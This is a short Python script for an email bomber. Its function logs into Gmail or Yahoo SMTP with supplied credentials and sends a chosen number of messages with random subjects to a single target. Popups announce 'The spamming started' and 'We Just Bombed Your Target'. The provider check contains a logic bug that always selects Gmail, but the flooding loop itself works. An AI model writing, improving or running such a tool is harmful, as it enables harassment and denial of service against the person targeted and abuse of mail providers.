import os
import smtplib
from tkinter import messagebox
import sys


def bomb_email(server, user, passwd, to, body, total):
    if server == 'gmail' or "Gmail" or "":
        smtp_server = 'smtp.gmail.com'
        port = 587
    elif server == 'yahoo'or "Yahoo":
        smtp_server = 'smtp.mail.yahoo.com'
        port = 587
    else:
        sys.exit()
    try:
        server = smtplib.SMTP(smtp_server, port)

        server.ehlo()

        if smtp_server == "smtp.gmail.com":
            server.starttls()
        server.login(user, passwd)
        messagebox.showinfo(title="Succeeded", message="Ok, The spamming started🥰")
        for i in range(1, total + 1):
            subject = os.urandom(9)
            msg = "From : " + str(user) + "\n Subject: " + str(subject) + " \n" + str(body)
            server.sendmail(user, to, msg)
            sys.stdout.flush()
        server.quit()
        messagebox.showinfo(title="Succeeded", message="We Just Bombed Your Target")
    except KeyboardInterrupt:
        sys.exit(1)
    except smtplib.SMTPAuthenticationError:
        messagebox.showerror(title="Error", message="The username or password you entered is incorrect")

